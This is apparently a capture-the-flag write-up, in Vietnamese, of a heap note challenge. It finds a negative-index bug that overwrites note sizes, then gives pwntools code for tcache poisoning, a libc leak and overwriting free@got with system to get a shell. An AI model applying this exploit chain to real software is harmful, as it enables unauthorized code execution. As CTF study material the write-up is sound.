**1. Tìm bug**
  - chương trình thực hiện một note như này
  - ![image](https://user-images.githubusercontent.com/113702087/217473671-e2db4496-683c-455b-a50f-cb4e4f3267a4.png)
  - note được thao tác trên heap, các chunk được lưu tại book và size được lưu tại notesize
  - ![image](https://user-images.githubusercontent.com/113702087/217472594-2a0eb93a-93f9-4900-9b17-b8118495102f.png)
  - kiểu tấn công mong muốn: tcache poisoning
  - ta có sẵn hàm add, remove và edit, tuy nhiên sau khi rm, thì chunk đó cũng bị xóa, vậy nên không thể sử dụng edit để tạo bug UAF
  - ![image](https://user-images.githubusercontent.com/113702087/217475941-ce3d52cf-1eb0-4096-a8d7-c190c1b31e49.png)
  - arg của add_note là id và được ép kiểu int, do đó ta có thể nhập số âm, với notesize lại ở trên book do đó ta có thể control được size của chunk tương ứng
  - tại hàm edit khi thực hiện read thì size được lấy theo notesize do đó sẽ gây lỗi heap overflow
  - ![image](https://user-images.githubusercontent.com/113702087/217485741-87c700c9-8e77-44be-a3a5-94bfb713f6df.png)

**2. Exploit**
  - sử dụng kỹ thuật poisoning để cấp phát một chunk theo ý muốn, ở đây chunk muốn cấp phát là 0x404000
  - chunk này nằm trên free got do đó có thể ghi đè được got, cùng với việc malloc có thể làm mất dữ liệu của các địa chỉ liền kề do đó có thể gây crash chương trình khi cấp phát vào got
  - sau khi có được địa chỉ 0x404000 ta có thể dùng overflow để leak libc với hàm readnote
  - ta sẽ tạo chunk như sau
  ```
  size_t = 16
note(1, 0, size_t)
note(1, 1, size_t)
note(1, 2, size_t)
choice(2)
choice(1)
note(1, -4, 48)
  ```
  - ta sẽ tạo một chunk với id -4 ghi đè vào notesize để overflow chunk đầu và 2 chunk sau sẽ được free
  - ![image](https://user-images.githubusercontent.com/113702087/217495229-50016da5-3e9b-4654-88c2-9a7b6b25c4a0.png)
  - setup các chunk từ tcache
  ```
  payload = b'a'*24 + p64(0x31) + p64(exe.got['free']-0x18)
note(2, 0, size_t, payload)
note(1, 1, size_t, b'/bin/sh\x00')
note(1, 2, size_t, b'a'*16)
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/217500341-750462df-b3f7-4f60-990d-17e386803c92.png)
  - control lại size của 0x404000 và leak libc
  ```
  note(1, -3, 48)
choice(2, 4) #(id, choice = 3)
r.recv(22)
libc_leak = r.recv(6)
libc.address = u64(libc_leak + b'\x00'*2) - 0x1e3bb0
print(hex(u64(libc_leak + b'\x00'*2)))
print(hex(libc.address))
  ```
  - ghi đè free got thành system và lấy shell
  ```
  payload = b'a'*0x18 + p64(libc.sym['system'])
note(2, 2, size_t, payload)
choice(1)
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/217500910-81ef4230-529f-4596-9e5b-94603214cf6c.png)
  - ![image](https://user-images.githubusercontent.com/113702087/217501119-c59ed49b-3216-42fb-97d3-ff8cf1e3e779.png)
